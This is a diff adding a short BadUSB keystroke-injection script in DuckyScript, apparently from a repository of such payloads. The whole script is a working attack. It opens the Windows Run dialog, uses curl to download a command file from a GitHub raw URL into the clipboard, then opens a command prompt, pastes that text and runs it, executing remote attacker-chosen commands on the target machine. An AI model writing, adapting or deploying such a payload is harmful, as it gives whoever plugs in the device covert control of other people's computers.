@@ -1,0 +1,13 @@
+DEFAULTDELAY 10
+GUI r
+DELAY 400
+STRING cmd /c "curl -s https://raw.githubusercontent.com/nrosa2009r-lgtm/bad_usb_scripts/refs/heads/master/command.txt | clip" 
+ENTER
+DELAY 200
+GUI r
+DELAY 400
+STRING cmd
+ENTER
+DELAY 400
+CTRL v
+ENTER
